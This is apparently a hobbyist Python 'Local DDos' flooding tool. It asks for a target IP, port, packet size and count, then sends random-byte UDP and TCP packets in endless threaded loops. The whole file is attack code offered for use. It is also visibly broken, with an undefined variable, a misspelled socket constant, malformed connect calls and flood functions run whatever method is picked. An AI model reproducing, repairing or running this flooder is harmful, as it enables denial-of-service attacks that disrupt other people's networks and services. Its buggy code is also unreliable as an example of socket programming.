import random
import os
import threading
import socket
import time
import datetime
from colorama import Fore, Style
from pystyle import Colorate, Colors
from tqdm import tqdm, trange

#pip install tqdm && pip install pystyle && pip install colorama && pip install datetime

progressbar = tqdm([1,2,3,4,5,6,7,8,9,10])
for item in progressbar:
    time.sleep(0.1)
    progressbar.set_description(f' {Fore.LIGHTBLUE_EX}Loading {Fore.WHITE}► ► ► {Fore.RED}')
print("")
os.system("cls")

#max package 65507

os.system("title --Local DDos--")

result = time.localtime()
hour = result.tm_hour
minute = result.tm_min
second = result.tm_sec
print(f'''

                  {Fore.WHITE}██████{Fore.RED}╗ {Fore.WHITE}███████{Fore.RED}╗ {Fore.WHITE}█████{Fore.RED}╗ {Fore.WHITE}████████{Fore.RED}╗{Fore.WHITE}██{Fore.RED}╗  {Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}███████{Fore.RED}╗
                  {Fore.WHITE}██{Fore.RED}╔══{Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}██{Fore.RED}╔════╝{Fore.WHITE}██{Fore.RED}╔══{Fore.WHITE}██{Fore.RED}╗╚══{Fore.WHITE}██{Fore.RED}╔══╝{Fore.WHITE}██{Fore.RED}║  {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}╔════╝
                  {Fore.WHITE}██{Fore.RED}║  {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}█████{Fore.RED}╗  {Fore.WHITE}███████{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}███████{Fore.RED}║{Fore.WHITE}███████{Fore.RED}╗     {Fore.MAGENTA}[Project by: leaves and MrNoobking]
                  {Fore.WHITE}██{Fore.RED}║  {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}╔══╝  {Fore.WHITE}██{Fore.RED}╔══{Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}╔══{Fore.WHITE}██{Fore.RED}║╚════{Fore.WHITE}██{Fore.RED}║
                  {Fore.WHITE}██████{Fore.RED}╔╝{Fore.WHITE}███████{Fore.RED}╗{Fore.WHITE}██{Fore.RED}║  {Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║  {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}███████{Fore.RED}║
                  {Fore.RED}╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝
                                                 

''')
ip = input(f'{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.MAGENTA}══════►{Fore.RED}[{Fore.BLUE}={Fore.WHITE}Ip{Fore.BLUE}={Fore.RED}] {Fore.WHITE}$ ')
os.system(f"title --Local DDos-- -ip {ip} -port ? -package ? -times ? -Method ?")
result = time.localtime()
hour = result.tm_hour
minute = result.tm_min
second = result.tm_sec

port = int(input(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.MAGENTA}   ╚══════►{Fore.RED}[{Fore.BLUE}={Fore.WHITE}Port{Fore.BLUE}={Fore.RED}] {Fore.WHITE}$ "))
os.system(f"title --Local DDos-- -ip {ip} -port {port} -package ? -times ? -Method ?")
result = time.localtime()
hour = result.tm_hour
minute = result.tm_min
second = result.tm_sec

package = int(input(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.MAGENTA}     ╚══════►{Fore.RED}[{Fore.BLUE}={Fore.WHITE}Package{Fore.BLUE}={Fore.RED}] {Fore.WHITE}$ "))
os.system(f"title --Local DDos-- -ip {ip} -port {port} -package {package} -times ? -Method ?")
result = time.localtime()
hour = result.tm_hour
minute = result.tm_min
second = result.tm_sec

times = int(input(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.MAGENTA}       ╚════════►{Fore.RED}[{Fore.BLUE}={Fore.WHITE}Times{Fore.BLUE}={Fore.RED}] {Fore.WHITE}$ "))
os.system(f"title --Local DDos-- -ip {ip} -port {port} -package {package} -times {times} -Method ?")
result = time.localtime()
hour = result.tm_hour
minute = result.tm_min
second = result.tm_sec


print(Colorate.Horizontal(Colors.red_to_blue, f'''
               ╔════════════════════════════════════════════════════════╗
               ║    Method udp:                                         ║
               ║      udp1 = send data to ip twice in loop              ║
               ║      udp2 = connect to ip and send data twice in loop  ║
               ║      udp3 = send data to ip onces in loop              ║                                
               ║      udp4 = connect to ip and send data onces in loop  ║ 
               ║    Method tcp:                                         ║
               ║      tcp1 = send data to ip twice in loop              ║
               ║      tcp2 = connect to ip and send data twice in loop  ║
               ║      tcp3 = send data to ip onces in loop              ║                                
               ║      tcp4 = connect to ip and send data onces in loop  ║ 
               ╚════════════════════════════════════════════════════════╝
                                                                              
'''))
Method = input(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.MAGENTA}•═════►{Fore.MAGENTA}{Fore.RED}[{Fore.BLUE}={Fore.WHITE}Method{Fore.BLUE}={Fore.RED}] {Fore.WHITE}$ ")
os.system(f"title --Local DDos-- -ip {ip} -port {port} -package {package} -times {times} -Method {Method1}")
time.sleep(3)

def udp1():
    data = random._urandom(package)
    while True:
        try:
            result = time.localtime()
            hour = result.tm_hour
            minute = result.tm_min
            second = result.tm_sec
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data, addr)
            print(f"[{Fore.BLUE}{hour}:{minute}:{second}{Fore.RED}] {Fore.MAGENTA}Sent {Fore.RED}{package} {Fore.MAGENTA}package to {Fore.YELLOW}{ip}:{port}{Fore.RED} [{Fore.BLUE}!{Fore.RED}]")
        except:
            s.close()
            print("[!!!] Error !!!")
            time.sleep(5)
            exit()


for x in range(times):
    if Method == "udp1":
        th = threading.Thread(target = udp1)
        th.start()
udp1()

def udp2():

    data = random._urandom(package)
    while True:
        try:
            result = time.localtime()
            hour = result.tm_hour
            minute = result.tm_min
            second = result.tm_sec
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.connect((data, addr))
                s.send(data)
            print(f"[{Fore.BLUE}{hour}:{minute}:{second}{Fore.RED}] {Fore.MAGENTA}Sent {Fore.RED}{package} {Fore.MAGENTA}package to {Fore.YELLOW}{ip}:{port}{Fore.RED} [{Fore.BLUE}!{Fore.RED}]")
        except:
            s.close()
            print(f"{Fore.RED}[!!!] ERROR !!!")
            os.system("pause")
            exit()


for x in range(times):
    if Method == "udp2":
        th = threading.Thread(target = udp2)
        th.start()
udp2()

#method 2

def udp3():

    data = random._urandom(package)
    while True:
        try:
            result = time.localtime()
            hour = result.tm_hour
            minute = result.tm_min
            second = result.tm_sec
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data, addr)
            print(f"[{Fore.BLUE}{hour}:{minute}:{second}{Fore.RED}] {Fore.MAGENTA}Sent {Fore.RED}{package} {Fore.MAGENTA}package to {Fore.YELLOW}{ip}:{port}{Fore.RED} [{Fore.BLUE}!{Fore.RED}]")
        except:
            s.close()
            print(f"{Fore.RED}[!!!] ERROR !!!")
            os.system("pause")
            exit()
udp3()

def udp4(): 
    data = random._urandom(package)
    while True:
        try:
            result = time.localtime()
            hour = result.tm_hour
            minute = result.tm_min
            second = result.tm_sec
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.connect((data, addr))
                s.send(data)
            print(f"[{Fore.BLUE}{hour}:{minute}:{second}{Fore.RED}] {Fore.MAGENTA}Sent {Fore.RED}{package} {Fore.MAGENTA}package to {Fore.YELLOW}{ip}:{port}{Fore.RED} [{Fore.BLUE}!{Fore.RED}]")
        except:
            s.close()
            print(f"{Fore.RED}[!!!] ERROR !!!")
            os.system("pause")
            exit()
udp4()

for x in range(times):
    if Method == "udp4":
        th = threading.Thread(target = udp4)
        th.start()

for x in range(times):
    if Method == "udp3":
        th = threading.Thread(target = udp3)
        th.start()


#tcp

def tcp1():
    data = random._urandom(package)
    while True:
        try:
            result = time.localtime()
            hour = result.tm_hour
            minute = result.tm_min
            second = result.tm_sec
            s = socket.socket(socket.AF_INET, socket.SOCK_STEAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data, addr)
            print(f"[{Fore.BLUE}{hour}:{minute}:{second}{Fore.RED}] {Fore.MAGENTA}Sent {Fore.RED}{package} {Fore.MAGENTA}package to {Fore.YELLOW}{ip}:{port}{Fore.RED} [{Fore.BLUE}!{Fore.RED}]")
        except:
            s.close()
            print("[!!!] Error !!!")
            time.sleep(5)
            exit()


for x in range(times):
    if Method == "tcp1":
        th = threading.Thread(target = tcp1)
        th.start()
tcp1()

def tcp2():

    data = random._urandom(package)
    while True:
        try:
            result = time.localtime()
            hour = result.tm_hour
            minute = result.tm_min
            second = result.tm_sec
            s = socket.socket(socket.AF_INET, socket.SOCK_STEAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.connect((data, addr))
                s.send(data)
            print(f"[{Fore.BLUE}{hour}:{minute}:{second}{Fore.RED}] {Fore.MAGENTA}Sent {Fore.RED}{package} {Fore.MAGENTA}package to {Fore.YELLOW}{ip}:{port}{Fore.RED} [{Fore.BLUE}!{Fore.RED}]")
        except:
            s.close()
            print(f"{Fore.RED}[!!!] ERROR !!!")
            os.system("pause")
            exit()


for x in range(times):
    if Method == "tcp2":
        th = threading.Thread(target = tcp2)
        th.start()
tcp2()

#method 2

def tcp3():

    data = random._urandom(package)
    while True:
        try:
            result = time.localtime()
            hour = result.tm_hour
            minute = result.tm_min
            second = result.tm_sec
            s = socket.socket(socket.AF_INET, socket.SOCK_STEAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data, addr)
            print(f"[{Fore.BLUE}{hour}:{minute}:{second}{Fore.RED}] {Fore.MAGENTA}Sent {Fore.RED}{package} {Fore.MAGENTA}package to {Fore.YELLOW}{ip}:{port}{Fore.RED} [{Fore.BLUE}!{Fore.RED}]")
        except:
            s.close()
            print(f"{Fore.RED}[!!!] ERROR !!!")
            os.system("pause")
            exit()
tcp3()

def tcp4(): 
    data = random._urandom(package)
    while True:
        try:
            result = time.localtime()
            hour = result.tm_hour
            minute = result.tm_min
            second = result.tm_sec
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.connect((data, addr))
                s.send(data)
            print(f"[{Fore.BLUE}{hour}:{minute}:{second}{Fore.RED}] {Fore.MAGENTA}Sent {Fore.RED}{package} {Fore.MAGENTA}package to {Fore.YELLOW}{ip}:{port}{Fore.RED} [{Fore.BLUE}!{Fore.RED}]")
        except:
            s.close()
            print(f"{Fore.RED}[!!!] ERROR !!!")
            os.system("pause")
            exit()
tcp4()

for x in range(times):
    if Method == "tcp4":
        th = threading.Thread(target = tcp4)
        th.start()

for x in range(times):
    if Method == "tcp3":
        th = threading.Thread(target = tcp3)
        th.start()
